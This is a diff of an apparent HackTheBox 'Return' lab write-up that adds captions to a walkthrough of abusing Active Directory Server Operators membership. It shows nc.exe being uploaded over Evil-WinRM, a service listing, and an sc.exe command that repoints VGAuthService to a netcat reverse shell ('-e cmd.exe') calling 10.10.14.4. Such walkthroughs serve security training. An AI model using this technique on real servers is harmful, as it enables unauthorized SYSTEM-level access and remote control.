@@ -1,5 +1,7 @@
 **Server Operators** is a built-in group in Active Directory that grants members specific administrative capabilities over domain controllers. Members can manage services, including starting and stopping most services, perform backup and restore operations, shut down and restart the server, and handle disk management tasks.
 
+Upload nc.exe:
+
 ```bash
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /home/garffff/htb/return/nc.exe
                                         
@@ -9,6 +11,8 @@ Data: 37544 bytes of 37544 bytes copied
                                         
 Info: Upload successful!
 ```
+
+List all services:
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc-printer\desktop> services
@@ -27,6 +31,8 @@ C:\Windows\servicing\TrustedInstaller.exe                                       
 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
 "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
 ```
+
+Configure the service with the payload. Stop and start the service:
 
 ```bash
 sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.4 443"
